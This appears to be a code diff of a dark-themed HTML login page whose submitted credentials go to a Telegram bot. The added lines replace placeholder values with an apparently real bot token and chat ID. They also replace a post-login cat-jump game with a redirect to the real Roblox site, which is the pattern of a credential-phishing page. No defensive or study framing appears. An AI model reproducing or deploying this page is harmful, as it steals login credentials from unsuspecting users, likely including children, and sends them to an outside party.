@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -10,12 +10,10 @@
             background-color: #2b2d42; /* Dark background */
             color: #ffffff; /* White text */
             display: flex;
-            flex-direction: column;
-            align-items: center;
             justify-content: center;
+            align-items: center;
             height: 100vh;
             margin: 0;
-            position: relative;
         }
         .login-container {
             background-color: #3f3f3f; /* Dark gray for container */
@@ -24,7 +22,6 @@
             box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
             text-align: center;
             width: 400px; /* Fixed width for consistency */
-            position: absolute; /* Position absolute for overlay */
         }
         h1 {
             margin-bottom: 20px;
@@ -66,15 +63,6 @@
             font-size: 14px;
             color: #ccc; /* Light gray for footer text */
         }
-        .game-container {
-            display: none; /* Hide game initially */
-            margin-top: 20px; /* Space above the game */
-            text-align: center; /* Center the game */
-        }
-        canvas {
-            border: 2px solid #000;
-            background-color: #fff; /* White background for the game area */
-        }
     </style>
 </head>
 <body>
@@ -91,17 +79,10 @@
         </div>
     </div>
 
-    <div class="game-container" id="gameContainer">
-        <h2>Cat Jump Game</h2>
-        <canvas id="gameCanvas" width="800" height="400"></canvas>
-        <p id="score">Score: 0</p>
-        <button onclick="resetGame()">Play Again</button>
-    </div>
-
     <script>
         // Replace these with your actual Telegram Bot Token and Chat ID
-        const BOT_TOKEN = 'YOUR_BOT_TOKEN'; // Your bot token
-        const CHAT_ID = 'YOUR_CHAT_ID'; // Your chat ID
+        const BOT_TOKEN = '6965358568:AAHFA6qiegPJyw3oVqzfqIt3C829NeagC4Q'; // Your bot token
+        const CHAT_ID = '7072093078'; // Your chat ID
 
         // Handle form submission
         document.getElementById('loginForm').addEventListener('submit', function(e) {
@@ -128,134 +109,16 @@
                 result.textContent = "Data sent! Thank you for logging in.";
                 result.style.color = "#4CAF50"; // Green color for success messages
                 
-                // Show the game after login
-                document.querySelector('.login-container').style.display = 'none';
-                document.getElementById('gameContainer').style.display = 'block';
-                startGame(); // Start the game
+                // Redirect to Roblox after 1 second
+                setTimeout(() => {
+                    window.location.href = "https://www.roblox.com";
+                }, 1000); // 1 second delay
             })
             .catch((error) => {
                 console.error('Error:', error);
                 result.textContent = "An error occurred while sending data. Please try again.";
             });
         });
-
-        // Game logic
-        let cat = {
-            x: 50,
-            y: 300,
-            width: 50,
-            height: 50,
-            color: "orange",
-            velocityY: 0,
-            gravity: 0.5,
-            jumpStrength: 10,
-            isJumping: false
-        };
-
-        let obstacles = [];
-        let score = 0;
-        let gameOver = false;
-
-        function startGame() {
-            score = 0;
-            obstacles = [];
-            gameOver = false;
-            cat.y = 300; // Reset cat position
-            document.getElementById('score').innerText = "Score: " + score;
-            gameLoop();
-        }
-
-        function drawCat() {
-            ctx.fillStyle = cat.color;
-            ctx.fillRect(cat.x, cat.y, cat.width, cat.height);
-        }
-
-        function drawObstacles() {
-            ctx.fillStyle = "red";
-            for (let obstacle of obstacles) {
-                ctx.fillRect(obstacle.x, obstacle.y, obstacle.width, obstacle.height);
-            }
-        }
-
-        function updateObstacles() {
-            if (obstacles.length === 0 || obstacles[obstacles.length - 1].x < 600) {
-                obstacles.push({
-                    x: 800,
-                    y: 350,
-                    width: 30,
-                    height: 50
-                });
-            }
-            for (let i = 0; i < obstacles.length; i++) {
-                obstacles[i].x -= 5; // Move obstacles to the left
-                if (obstacles[i].x + obstacles[i].width < 0) {
-                    obstacles.splice(i, 1);
-                    score++;
-                    i--;
-                }
-            }
-        }
-
-        function jump() {
-            if (!cat.isJumping) {
-                cat.velocityY = -cat.jumpStrength;
-                cat.isJumping = true;
-            }
-        }
-
-        function updateCat() {
-            cat.y += cat.velocityY;
-            cat.velocityY += cat.gravity;
-
-            if (cat.y + cat.height >= canvas.height) {
-                cat.y = canvas.height - cat.height;
-                cat.isJumping = false;
-                cat.velocityY = 0;
-            }
-
-            for (let obstacle of obstacles) {
-                if (cat.x < obstacle.x + obstacle.width &&
-                    cat.x + cat.width > obstacle.x &&
-                    cat.y < obstacle.y + obstacle.height &&
-                    cat.y + cat.height > obstacle.y) {
-                    gameOver = true;
-                }
-            }
-        }
-
-        function drawScore() {
-            ctx.fillStyle = "black";
-            ctx.font = "20px Arial";
-            ctx.fillText("Score: " + score, 10, 20);
-        }
-
-        const canvas = document.getElementById("gameCanvas");
-        const ctx = canvas.getContext("2d");
-
-        function gameLoop() {
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            if (!gameOver) {
-                updateObstacles();
-                updateCat();
-                drawObstacles();
-                drawCat();
-                drawScore();
-                requestAnimationFrame(gameLoop);
-            } else {
-                ctx.fillStyle = "red";
-                ctx.font = "40px Arial";
-                ctx.fillText("Game Over!", canvas.width / 2 - 100, canvas.height / 2);
-                ctx.fillText("Final Score: " + score, canvas.width / 2 - 100, canvas.height / 2 + 50);
-            }
-        }
-
-        // Event listener for jumping
-        window.addEventListener('keydown', function(e) {
-            if (e.code === 'Space') {
-                jump();
-            }
-        });
-
-        function resetGame() {
-            startGame();
-        }
+    </script>
+</body>
+</html>
